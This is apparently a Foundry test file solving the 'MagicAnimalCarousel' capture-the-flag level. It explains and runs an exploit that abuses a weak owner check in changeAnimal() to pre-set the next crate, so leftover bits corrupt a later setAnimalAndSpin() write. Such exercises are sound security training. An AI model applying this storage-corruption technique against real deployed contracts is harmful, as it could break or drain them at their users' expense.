// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IMagicAnimalCarousel {
  function currentCrateId() external returns (uint256);
  function carousel(uint256 crateId) external returns (uint256 animalInside);
  function setAnimalAndSpin(string calldata animal) external;
  function changeAnimal(string calldata animal, uint256 crateId) external;
}

contract MagicAnimalCarouselTest is Test {
  address private challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xd8630853340e23CeD1bb87a760e2BaF095fb4009);
  }

  function testExploit() public {
    // Exploit Analysis
    //
    // The weak owner check allows an attacker to modify the target crate via
    // `changeAnimal()` without proper restriction.
    // Thus, the pre-existing bits remain and interfere with the new value added by
    // `setAnimalAndSpin()`, leading to an unintended stored value.
    //
    // Attack Description
    //
    // - Call changeAnimal("Monkey", currentCrateId + 1) to pre-set the next crate.
    // - As `currentCrateId` is 0, the value will be stored at carousel[1].
    //   We can do this because the bits corresponding to `owner` at that key equal
    //   address(0), passing the initial verification.
    // - The stored value corresponds to
    //   `0x4d6f6e6b65790000000000007fa9385be102ac3eac297483dd6233d62b3e1496`,
    //   where `0x4d6f6e6b657900000000` are the left-shifted bytes of "Monkey",
    //   `0x0000` corresponds to the NEXT_ID area (which remains untouched),
    //   and `0x7fa9385be102ac3eac297483dd6233d62b3e1496` is the address of the test contract.
    //
    // - Later, at verification time, setAnimalAndSpin("Goat") writes
    //   `0x0a000f1f6579000000000002ffeb385bf50eaffefdbbf7a7fde2bbf6bfff549f`,
    //   where `0x0a000f1f657900000000` corresponds to the XOR of the encoded value
    //   of "Goat" and the existing encoded value of "Monkey".
    // - As a result, validation fails because an unintended stored value is present.
    uint256 currentCrateId = IMagicAnimalCarousel(challengeAddress).currentCrateId();
    IMagicAnimalCarousel(challengeAddress).changeAnimal("Monkey", currentCrateId + 1);

    utils.submitLevelInstance(challengeAddress);
  }
}
